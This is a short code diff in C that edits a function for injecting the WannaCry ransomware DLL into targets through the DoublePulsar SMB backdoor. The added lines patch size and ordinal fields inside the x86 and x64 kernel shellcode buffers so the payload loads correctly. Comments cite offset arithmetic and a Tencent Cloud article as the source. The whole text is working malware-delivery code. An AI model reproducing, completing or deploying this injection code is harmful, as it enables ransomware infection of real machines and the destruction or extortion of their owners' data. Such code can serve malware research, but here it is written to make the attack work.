@@ -197,12 +197,25 @@ int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, int
 	
 	if(architectureType)
 	{
+		/* source: https://cloud.tencent.com/developer/article/1910271 */
+		
 		//32 bits
 		rundll_shellcode = &x86_kernel_shellcode;
-		
+
+		/* 0x42ECE9 - 0x42E758 = 0x591 */
+		//update payload + shellcode size in the x86 kernel shellcode
+		*(DWORD*)&x86_kernel_shellcode[1425] = 0x50D800+3440;
+
+		//update DLL size
+		*(DWORD*)&x86_kernel_shellcode[0x12FD] = 0x50D800;
+
+		//update ordinal
+		*(DWORD*)&x86_kernel_shellcode[0x1301] = 1;
 	}
 	else
 	{
+		/* source: https://cloud.tencent.com/developer/article/1910271 */
+		
 		//64 bits
 		rundll_shellcode = &x64_kernel_shellcode;
 		
@@ -212,7 +225,8 @@ int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, int
 		*/
 		DWORD DLL_and_UserlandShellcodeSize = 0x50D800 + 3978;
 		*(DWORD*)&x64_kernel_shellcode[0x86E] = DLL_and_UserlandShellcodeSize;
-		//x64_kernel_shellcode[2158] = 
+		//0x4302CE - 0x42FA60 = 0x86E
+		//x64_kernel_shellcode[2158] = 6144+3978;
 		
 		/* Userland shellcode DLL size len */
 		/* this value was obtained from subtracting the Userland shellcode size from the Total size of the entire shellcode
